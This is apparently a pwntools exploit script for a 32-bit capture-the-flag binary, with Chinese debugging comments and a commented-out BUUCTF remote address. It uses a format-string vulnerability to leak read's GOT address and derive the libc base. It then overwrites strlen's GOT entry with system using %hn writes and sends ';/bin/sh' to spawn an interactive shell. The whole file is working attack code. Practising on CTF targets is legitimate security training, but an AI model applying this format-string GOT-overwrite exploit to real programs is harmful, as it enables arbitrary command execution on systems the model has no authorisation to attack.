from pwn import *
from LibcSearcher import *
context(log_level='debug',os='linux',arch='i386')
pwnfile = './32_fmt2'
io=process(pwnfile)
#io=remote('node4.buuoj.cn',29941)
elf = ELF(pwnfile)
libc = ELF('./libc-2.23.so')


def debug():
	gdb.attach(io,"b *0x804874b")
	pause()

'''b是用来补齐  泄漏位置  为8
pay = b'baaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p'
gdb.attach(io)
pause()
io.sendlineafter('Please tell me:',pay)
'''

read_got = elf.got['read']
strlen_got = elf.got['strlen']
pay = b'a'+p32(read_got) + b'cc' + b'%8$s\n'
io.sendlineafter('Please tell me:',pay)

io.recvuntil("cc")
read_addr = u32(io.recv(4))
print('strlen_got--->',hex(strlen_got))
'''
libc = LibcSearcher('read',read_addr)
libc_base = read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
'''
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
print('system_addr--->',hex(system_addr))


'''
直接使用$n总是修改不成功，直接变成0x14(多次都是)
pay1 = b'A' + p32(printf_got) + b'%' + p32(system_addr) + b'c%8$n' 
'''
debug()
high_sys = (system_addr >> 16) & 0xffff
low_sys = system_addr & 0xffff
'''
pay1 = b'a' + p32(strlen_got) +p32(strlen_got+2)
pay1 += b'%'+str(low_sys-18).encode("utf-8")+b'c%8$hn'
pay1 += b'%'+str(high_sys-low_sys).encode("utf-8")+b'c%9$hn'
'''

pay1 = b'a%'+str(low_sys-10).encode("utf-8")+b'c%16$hn'
pay1 += b'%'+str(high_sys-low_sys).encode("utf-8")+b'c%17$hn'
#print("len--->",len(pay1))
pay1 = pay1.ljust(33,b'z')+p32(strlen_got)+p32(strlen_got+2)


#pay1 = b'a'+ fmtstr_payload(8,{strlen_got:system_addr-18})

io.sendafter('Please tell me:',pay1)
bin_sh = b';/bin/sh\x00'
io.sendafter('Please tell me:',bin_sh)

io.interactive()
